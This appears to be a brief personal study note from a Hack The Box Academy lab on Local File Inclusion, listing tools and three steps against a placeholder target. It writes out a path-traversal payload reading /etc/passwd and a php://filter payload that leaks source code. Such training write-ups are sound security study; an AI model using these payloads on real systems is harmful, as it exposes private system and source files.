🛡️ HTB Academy - Local File Inclusion (LFI)

📅 Completed: July 2025 -

---

Objective
Understand Local File Inclusion attack vectors and parameter exploitation in web applications.

---
🛠 Tools:
- Browser
- Burp Suite
- curl

---

🔍 Exploitation Steps
1. Access the vulnerable endpoint:
`http://target/?page=...`

2. Try the payload:
?page=../../../../etc/passwd

3. Use `php://filter` to bypass:
?page=php://filter/convert.base64-encode/resource=index
